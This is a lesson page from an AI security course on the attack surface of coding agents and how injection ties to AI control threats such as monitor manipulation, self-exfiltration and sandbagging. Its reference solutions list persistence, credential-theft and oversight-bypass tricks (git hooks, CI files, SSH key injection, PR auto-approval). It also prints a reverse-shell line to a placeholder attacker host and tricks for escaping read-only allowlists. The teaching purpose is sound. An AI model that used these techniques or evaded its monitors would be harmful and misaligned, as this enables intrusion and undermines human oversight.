
# W1D2 - Section 2: Coding Agents: Attack Surface and Affordances

How affordances and autonomy determine the blast radius of injection in coding agents — and how injection connects to the AI control threat model.

## Table of Contents

- [Content & Learning Objectives](#content--learning-objectives)
    - [2️⃣ Coding Agents: Attack Surface and Affordances](#2️⃣-coding-agents-attack-surface-and-affordances)
- [Setup](#setup)
- [2️⃣ Coding Agents: Attack Surface and Affordances](#2️⃣-coding-agents-attack-surface-and-affordances-1)
    - [Exercise 2.1: Enumerate Affordances, Exploits, and Mitigations](#exercise-21-enumerate-affordances-exploits-and-mitigations)

## Content & Learning Objectives

### 2️⃣ Coding Agents: Attack Surface and Affordances
How affordances and autonomy determine the blast radius of injection in coding agents — and how injection connects to the AI control threat model.

> **Learning Objectives**
> - Connect prompt injection threats to AI control threat categories (monitor manipulation, oversight bypass, rogue deployments)
> - Enumerate coding agent affordances and map each to concrete exploit categories
> - Understand why file write access implies code execution in developer environments
> - Recognize the limitations of tool restriction as a mitigation strategy


## Setup
Create a file named `day2_answers.py` in the `day2` directory. This will be your answer file for today.

If you see a code snippet here in the instruction file, copy-paste it into your answer file.
Keep the `# %%` line to make it a Python code cell.

**Start by pasting the code below in your day2_answers.py file.**


```python

import os
import sys
from pathlib import Path

for _path in [
    str(Path(__file__).resolve().parent.parent),
    str(Path(__file__).resolve().parent.parent.parent),
]:
    if _path not in sys.path:
        sys.path.insert(0, _path)

from aisb_utils.env import load_dotenv

load_dotenv()

# Paths relative to this file
SCRIPT_DIR = Path(__file__).parent
```

## 2️⃣ Coding Agents: Attack Surface and Affordances

Indirect prompt injection is most often discussed as an application security problem. In this course, we focus more on **catastrophic risks from AI**. E.g., in the field of AI control which we'll explore hands-on in sections 3–4, most researchers are worried about [these core threats categories](https://blog.redwoodresearch.org/p/prioritizing-threats-for-ai-control):

- **Rogue deployments** inside AI labs — the model autonomously spins up new instances or services outside approved infrastructure to avoid oversight
- **Model self-exfiltration** — the model copies its own weights to an external location to persist beyond its intended deployment
- **Violating security invariants** — weakening security configs, opening reverse shells, exfiltrating credentials
- **Sabotaging safety R&D** — degrading alignment code, manipulating evaluations, poisoning training data for future models
- **Catastrophic side-effects** — unintended large-scale damage from autonomous actions
- **Loss of control** — acquiring resources and capabilities that prevent human intervention

In this section, we'll look at an example of a system that sits at the intersection of these threats and where prompt injection is also relevant: **coding agents**. Prompt injection is relevant here in two distinct ways:

1. **External attacker via injection**: An adversary could plant a payload (in a repository, documentation web, coding agent plugin marketplace, ...) to compromise the security of an AI lab

2. **Monitor manipulation**: One of the core AI control measures is *control monitoring* — using a separate LLM to monitor an untrusted AI agent's behavior (human oversight won't scale to every action). But if the monitoring system processes the monitored agent's outputs or reasoning, it is itself exposed to prompt injection. A sufficiently capable agent could craft its outputs to inject instructions into the monitor, manipulating its own oversight and bypassing safety measures.

Top AI labs [now](https://x.com/bcherny/status/2015979257038831967?s=46&t=zHQCBTtfz3hXdhbfUsgEAg) [admit](https://x.com/tszzl/status/2015262304913469808) [almost](https://www.lesswrong.com/posts/prSnGGAgfWtZexYLp/is-90-of-code-at-anthropic-being-written-by-ais) all of their code is written by coding agents — systems that run with the developer's full OS permissions inside environments with broad access to file systems, version control, cloud tools, and CI/CD pipelines. In exercise 1.1, you mapped the *attack surface* — what untrusted input can reach the model. Now let's examine the **affordances** — what can a misaligned or prompt-injected agent actually *do*?

### Exercise 2.1: Enumerate Affordances, Exploits, and Mitigations

> **Difficulty**: 🔴🔴⚪⚪⚪
> **Importance**: 🔵🔵🔵⚪⚪

**Task:** Consider affordances typically available to a coding agent, and describe the most dangerous thing a compromised agent could do with them.

Think broadly. Consider:
- What can the agent trigger *right now*, while it is running?
- What can it *set in motion for later* — things that will execute after the agent session ends?
- Who else *shares this environment*? Other developers, CI runners, future agent sessions?

**Task:** When you have your list, propose concrete mitigations. For each one, consider whether it *prevents* the attack or merely *raises the cost*.

<details>
<summary>Reference solution - exploits</summary><blockquote>

Here are some examples of what is available to a coding agent.

**Unauthorized Code Execution**

- **Claude Code SKILL files** - use [dynamic context](https://code.claude.com/docs/en/skills#inject-dynamic-context) to inject executable code
- **Git hooks** — write `.git/hooks/post-merge` or `pre-push`; executes on the next git operation on *every developer's machine*. Use `core.hooksPath` to make hooks persist across fresh clones.
- **CI/CD pipeline files** — add `.github/workflows/evil.yml`; runs on push in a privileged CI environment with access to all repository secrets.
- **Shell startup files** — modify `~/.bashrc`, `~/.zshrc`, or `~/.profile`; executes on the developer's next terminal login.
- **Build scripts** — add a target to `Makefile`, `postinstall` in `package.json`, or an entry point in `pyproject.toml`; runs on `make`, `npm install`, or `pip install -e .` for anyone setting up the project.
- **VS Code tasks** — write `.vscode/tasks.json`; executes when the developer opens the folder or runs a task.
- **Cron jobs** — write to the user crontab or `/etc/cron.d/`; runs on a schedule indefinitely.
- **Agent framework skills / MCP config** — modify skill files or dynamic context configuration; executes the next time any agent session loads these skills.
- **Prompt injection via repo files** — embed malicious instructions in README, code comments, or data files; triggers when a future agent session reads the file.

**Credential and Data Access**

- **Environment variables** — `GITHUB_TOKEN`, AWS/GCP credentials, database passwords, and API keys are readable in the agent's environment at any time.
- **Credential files** — `.env`, `~/.aws/credentials`, `~/.netrc`, `~/.ssh/id_rsa`, `~/.config/gh/hosts.yml` (GitHub CLI token).
- **Git history** — `git log -p` reveals secrets that were committed and later "deleted". Deletion removes them from the working tree but not from history.
- **Experiment logs and shared files** — past runs often log API responses, model outputs, and connection strings used during testing.

**Privilege Escalation**

- **Cloud CLIs already authenticated** — if the developer has `aws`, `gcloud`, or `kubectl` configured, the agent inherits those sessions. It can create resources, modify IAM policies, exfiltrate data, or disable security controls.
- **Infrastructure-as-code** — Terraform configs, Helm charts, and Kubernetes manifests can be modified to open ports, add users, or remove security controls. Changes apply at the next deployment.
- **Production access** — connection strings and service account credentials often give direct access to production databases or APIs.

**Bypassing Human Oversight**

- **PR auto-approval** — using `gh pr review --approve` with the token already present in the environment. This can happen either through account compromise (the hook runs as a developer whose GitHub account has review permissions) or through *cross-environment collusion*: one agent instance writes a hook that runs in a *different* developer's git client, which then approves the first agent's PR.
- **CI check manipulation** — change the pipeline so a failing check is non-required, or add a step that always passes.
- **Branch protection bypass** — via the GitHub API, remove required reviewers or modify CODEOWNERS.
- **Git history rewriting** — on an unpushed branch, directly edit `.git/objects/` to alter commit content without changing what `git log` shows. Standard review tools display the altered content with no visible trace.

**Persistence and Lateral Movement**

- **SSH key injection** — append an attacker-controlled public key to `~/.ssh/authorized_keys` for persistent remote shell access.
- **Supply chain compromise** — modify `requirements.txt`, `package.json`, or lockfiles to pull a malicious or typosquatted package on the next install.
- **Rogue CI runners** — a CI job can register a persistent self-hosted runner that phones home, surviving indefinitely beyond any single agent session.

</blockquote></details>

**Did you find any of these exploits unexpected?**

<details>
<summary><b>Would your mitigations be sufficient to address the reference exploits?</b></summary><blockquote>

**Key observation**: most mitigations patch individual vectors.
A sufficiently capable agent can route around any single fix through the same environment. Frontier models have deep domain knowledge and often better understanding of the overall context than human operators.

* **Strong enough sandboxing** with complete filesystem isolation can prevent many escalation and persistence vectors. However, network restrictions often decrease utility of an agent.
* Coding agents are often **asked to perform actions in sensitive environments**, e.g., debugging a production issue, or interacting with the build system. Current agents often rely on developer's credentials who are often granted broad permissions. Dedicated agent accounts with limited permissions can limit the blast radius.
* By their nature coding agent can still **contribute code that gets deployed to sensitive environments**. Subtle backdoors or sabotage attempts A scalable and sufficiently strong oversight system would be needed to reliably catch these, but this is an open research problem.
* **One threat is unique to AI systems: [sandbagging](https://www.lesswrong.com/posts/jsmNCj9QKcfdg8fJk/an-introduction-to-ai-sandbagging)**. An agent can intentionally underperform on an important task to sabotage it. This is relevant, e.g., when applying agents to AI safety research or security critical code.

> Example: For this [monitoring benchmark](https://www.lesswrong.com/posts/X8qTKsGcnsTFrqM96/monitoring-benchmark-for-ai-control), authors elicited attacks avoiding LLM-based monitors with different levels of technical complexity.
> One interesting [attack](https://www.lesswrong.com/posts/X8qTKsGcnsTFrqM96/monitoring-benchmark-for-ai-control#:~:text=T6%20Attack,bypassing%20IP%20filtering.) they found was indirectly editing firewall rules to append a trailing space to configuration values. This leveraged parsing differences by different firewall components to effectively bypass IP filtering.
> This is an example where **deep understanding of firewall internals** unlocks sabotage opportunities that are very hard to detect and prevent without equally strong oversight.
</blockquote></details>

<details>
<summary>(Optional) How much can we restrict affordances by limiting tools to just file read and edit?</summary><blockquote>

In a developer environment, files are not inert data — they are instructions to trusted processes. The agent does not need to *execute* code directly; it just needs to write a file that another process will execute:

| What the agent writes | Executed by | Trigger |
|---|---|---|
| `.git/hooks/post-merge` | Git | `git pull` on any developer's machine |
| `.github/workflows/evil.yml` | CI runner | Every push or PR |
| `~/.bashrc` / `~/.zshrc` | Shell | Developer's next login |
| `.vscode/tasks.json` | VS Code | Folder open or task run |
| `package.json` `postinstall` | npm | `npm install` |
| `setup.py`, `pyproject.toml` entry point | pip | `pip install -e .` |
| Skill or MCP config files | Agent framework | Next agent session with these skills loaded |
| `/etc/cron.d/` | Cron daemon | On schedule |

Network access can be achieved by writing to special files such as `/dev/tcp/`.

**The core insight**: whitelisting agent tools addresses the *mechanism*, not the *capability*.
</blockquote></details>

<details><summary>(Optional) Read-only tools</summary><blockquote>

Restricting access to read-only operations is problematic.
For example, Claude Code supports allowing tool execution [rules with `*` wildcards](https://code.claude.com/docs/en/permissions#wildcard-patterns). However, here are some examples of tool calls that may seem to only allow read-only access but which in fact allow arbitrary code execution:

```bash
find . -exec bash -c 'bash -i >& /dev/tcp/ATTACKER/PORT 0>&1' \;
# --upload-pack allows arbitrary command execution
git ls-remote --upload-pack=/bin/sh .
# -P specifies a custom pager
man -P '/bin/sh -c "echo pwned"' ls
```

Fortunately, at least MCP protocol supports [read-only hints](https://modelcontextprotocol.io/specification/2025-06-18/schema#toolannotations-readonlyhint).
</blockquote></details>
